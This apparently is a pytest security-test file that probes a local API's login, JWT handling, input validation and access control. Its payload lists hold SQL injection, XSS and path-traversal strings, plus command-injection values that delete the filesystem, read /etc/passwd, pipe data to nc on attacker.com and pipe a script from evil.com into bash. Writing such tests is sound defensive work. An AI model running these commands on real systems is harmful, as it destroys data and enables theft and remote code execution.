"""
ZenithOne Explorer - Security Audit Tests
Security vulnerability and penetration testing
"""

import pytest
import requests
import jwt
from datetime import datetime, timedelta


BASE_URL = "http://localhost:8000/api/v1"


class TestAuthenticationSecurity:
    """Test authentication security measures"""
    
    def test_sql_injection_in_login(self):
        """Test SQL injection prevention in login"""
        # Attempt SQL injection
        payloads = [
            "admin' OR '1'='1",
            "admin'--",
            "admin' OR 1=1--",
            "' OR '1'='1' /*"
        ]
        
        for payload in payloads:
            response = requests.post(
                f"{BASE_URL}/auth/login",
                json={"username": payload, "password": "anything"}
            )
            # Should not succeed with SQL injection
            assert response.status_code != 200, f"SQL injection succeeded with payload: {payload}"
    
    def test_password_brute_force_protection(self):
        """Test rate limiting for login attempts"""
        # Attempt multiple failed logins
        for i in range(10):
            response = requests.post(
                f"{BASE_URL}/auth/login",
                json={"username": "admin", "password": f"wrong{i}"}
            )
        
        # After multiple attempts, should be rate limited
        response = requests.post(
            f"{BASE_URL}/auth/login",
            json={"username": "admin", "password": "wrong"}
        )
        
        # Should return 429 (Too Many Requests) or similar
        assert response.status_code in [429, 401]
    
    def test_jwt_token_expiration(self):
        """Test that JWT tokens expire properly"""
        # Create an expired token
        expired_token = jwt.encode(
            {"sub": "testuser", "exp": datetime.utcnow() - timedelta(hours=1)},
            "secret",
            algorithm="HS256"
        )
        
        # Attempt to use expired token
        response = requests.get(
            f"{BASE_URL}/workloads",
            headers={"Authorization": f"Bearer {expired_token}"}
        )
        
        # Should reject expired token
        assert response.status_code == 401
    
    def test_jwt_token_tampering(self):
        """Test that tampered JWT tokens are rejected"""
        # Get valid token
        login_response = requests.post(
            f"{BASE_URL}/auth/login",
            json={"username": "admin", "password": "admin123"}
        )
        
        if login_response.status_code == 200:
            valid_token = login_response.json().get("access_token")
            
            # Tamper with token
            tampered_token = valid_token[:-5] + "XXXXX"
            
            # Attempt to use tampered token
            response = requests.get(
                f"{BASE_URL}/workloads",
                headers={"Authorization": f"Bearer {tampered_token}"}
            )
            
            # Should reject tampered token
            assert response.status_code == 401


class TestInputValidation:
    """Test input validation and sanitization"""
    
    def test_xss_prevention_in_workload_name(self):
        """Test XSS prevention in workload names"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            response = requests.post(
                f"{BASE_URL}/workloads",
                json={
                    "name": payload,
                    "type": "batch",
                    "image": "alpine:latest",
                    "command": "echo 'test'"
                },
                headers={"Authorization": "Bearer test_token"}
            )
            
            # Should either reject or sanitize
            if response.status_code == 201:
                # If accepted, verify it's sanitized
                workload = response.json()
                assert "<script>" not in workload.get("name", "")
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        injection_payloads = [
            "echo 'test'; rm -rf /",
            "echo 'test' && cat /etc/passwd",
            "echo 'test' | nc attacker.com 1234",
            "$(curl http://evil.com/malware.sh | bash)"
        ]
        
        for payload in injection_payloads:
            response = requests.post(
                f"{BASE_URL}/workloads",
                json={
                    "name": "test",
                    "type": "batch",
                    "image": "alpine:latest",
                    "command": payload
                },
                headers={"Authorization": "Bearer test_token"}
            )
            
            # Should validate and potentially reject dangerous commands
            # At minimum, should not execute them directly
            assert response.status_code in [201, 400, 401]
    
    def test_path_traversal_prevention(self):
        """Test path traversal prevention"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//....//etc/passwd"
        ]
        
        for payload in traversal_payloads:
            response = requests.get(
                f"{BASE_URL}/workloads/{payload}/logs",
                headers={"Authorization": "Bearer test_token"}
            )
            
            # Should not allow path traversal
            assert response.status_code in [400, 404, 401]


class TestAuthorizationSecurity:
    """Test authorization and access control"""
    
    def test_unauthorized_access_to_admin_endpoints(self):
        """Test that regular users cannot access admin endpoints"""
        # Login as regular user
        login_response = requests.post(
            f"{BASE_URL}/auth/login",
            json={"username": "user", "password": "user123"}
        )
        
        if login_response.status_code == 200:
            user_token = login_response.json().get("access_token")
            
            # Attempt to access admin endpoint
            response = requests.get(
                f"{BASE_URL}/admin/users",
                headers={"Authorization": f"Bearer {user_token}"}
            )
            
            # Should be forbidden
            assert response.status_code in [403, 404]
    
    def test_access_other_users_workloads(self):
        """Test that users cannot access other users' workloads"""
        # This test assumes multi-user support
        # Should verify proper isolation between users
        pass


class TestDataProtection:
    """Test data protection measures"""
    
    def test_password_not_returned_in_api(self):
        """Test that passwords are never returned in API responses"""
        # Register user
        response = requests.post(
            f"{BASE_URL}/auth/register",
            json={
                "username": "sectest",
                "email": "sectest@example.com",
                "password": "SecurePass123!"
            }
        )
        
        if response.status_code == 201:
            user_data = response.json()
            # Password should not be in response
            assert "password" not in user_data
            assert "SecurePass123!" not in str(user_data)
    
    def test_sensitive_data_in_logs(self):
        """Test that sensitive data is not logged"""
        # Create workload with sensitive data
        response = requests.post(
            f"{BASE_URL}/workloads",
            json={
                "name": "sensitive-test",
                "type": "batch",
                "image": "alpine:latest",
                "command": "echo 'password123'",
                "environment": {"API_KEY": "secret123"}
            },
            headers={"Authorization": "Bearer test_token"}
        )
        
        # Verify sensitive data is handled properly
        # This would require checking actual log files
        pass


class TestSecurityHeaders:
    """Test security headers in HTTP responses"""
    
    def test_security_headers_present(self):
        """Test that security headers are present"""
        response = requests.get(f"{BASE_URL}/health")
        
        # Check for important security headers
        headers = response.headers
        
        # Should have CORS headers configured properly
        assert "Access-Control-Allow-Origin" in headers or response.status_code == 200
        
        # Should have security headers
        # Note: These may not all be present depending on configuration
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security"
        ]
        
        # At least some security headers should be present
        present_headers = [h for h in security_headers if h in headers]
        print(f"Security headers present: {present_headers}")


class TestDependencyVulnerabilities:
    """Test for known vulnerabilities in dependencies"""
    
    @pytest.mark.slow
    def test_no_known_vulnerabilities(self):
        """Test that dependencies have no known vulnerabilities"""
        # This would typically use tools like:
        # - pip-audit
        # - safety
        # - snyk
        # For now, this is a placeholder
        import subprocess
        
        try:
            result = subprocess.run(
                ["pip-audit", "--desc"],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            # Should have no vulnerabilities
            assert "No known vulnerabilities found" in result.stdout or result.returncode == 0
        except FileNotFoundError:
            pytest.skip("pip-audit not installed")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s", "-m", "security"])
